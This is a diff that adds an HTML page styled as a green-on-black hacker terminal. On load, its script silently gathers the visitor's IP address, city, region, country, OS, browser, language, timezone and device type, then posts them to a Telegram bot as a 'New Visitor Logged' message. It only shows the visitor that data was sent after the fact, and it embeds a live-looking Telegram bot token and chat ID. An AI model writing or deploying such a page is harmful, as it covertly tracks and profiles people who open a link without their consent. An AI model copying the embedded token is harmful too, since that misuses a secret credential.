@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Terminal</title>
+  <style>
+    body {
+      background: #000;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+      overflow: hidden;
+    }
+    .terminal {
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    .cursor {
+      display: inline-block;
+      width: 10px;
+      background: #00ff00;
+      animation: blink 1s step-start 0s infinite;
+    }
+    @keyframes blink {
+      50% { background: transparent; }
+    }
+  </style>
+</head>
+<body>
+  <div class="terminal" id="terminal">Initializing terminal<span class="cursor"></span></div>
+
+  <script>
+    const terminal = document.getElementById('terminal');
+
+    const BOT_TOKEN = '8113922819:AAG12Ahv77M_szvNKPI3H-wvHzcQxfyS-ho';
+    const CHAT_ID = '-1002506645188';
+
+    function typeLine(text, delay = 50) {
+      return new Promise(resolve => {
+        let i = 0;
+        const interval = setInterval(() => {
+          terminal.innerHTML = terminal.innerHTML.replace('<span class="cursor"></span>', '') + text.charAt(i++) + '<span class="cursor"></span>';
+          if (i >= text.length) {
+            clearInterval(interval);
+            resolve();
+          }
+        }, delay);
+      });
+    }
+
+    function detectDeviceType() {
+      return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+    }
+
+    async function fetchIPData() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        return await res.json();
+      } catch (e) {
+        return { ip: 'N/A', city: 'N/A', region: 'N/A', country_name: 'N/A' };
+      }
+    }
+
+    async function gatherAndSendData() {
+      const ipData = await fetchIPData();
+
+      const data = {
+        IP: ipData.ip,
+        City: ipData.city,
+        Region: ipData.region,
+        Country: ipData.country_name,
+        OS: navigator.platform,
+        Browser: navigator.userAgent,
+        Language: navigator.language,
+        Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        DateTime: new Date().toString(),
+        Device: detectDeviceType()
+      };
+
+      const message = `🕵️‍♂️ New Visitor Logged:\n\n` +
+        `IP: ${data.IP}\n` +
+        `City: ${data.City}\n` +
+        `Region: ${data.Region}\n` +
+        `Country: ${data.Country}\n` +
+        `OS: ${data.OS}\n` +
+        `Browser: ${data.Browser}\n` +
+        `Language: ${data.Language}\n` +
+        `Timezone: ${data.Timezone}\n` +
+        `Date & Time: ${data.DateTime}\n` +
+        `Device: ${data.Device}`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+
+      return message;
+    }
+
+    async function init() {
+      await typeLine('\n> Accessing secure node...');
+      await typeLine('\n> Establishing connection...');
+      await typeLine('\n> Gathering system data...\n');
+
+      const data = await gatherAndSendData();
+
+      await typeLine('\n> Data sent to mainframe ✅');
+      await typeLine('\n> Terminal ready.\n\n');
+      await typeLine(data.split('\n').map(line => '> ' + line).join('\n'), 10);
+    }
+
+    init();
+  </script>
+</body>
+</html>
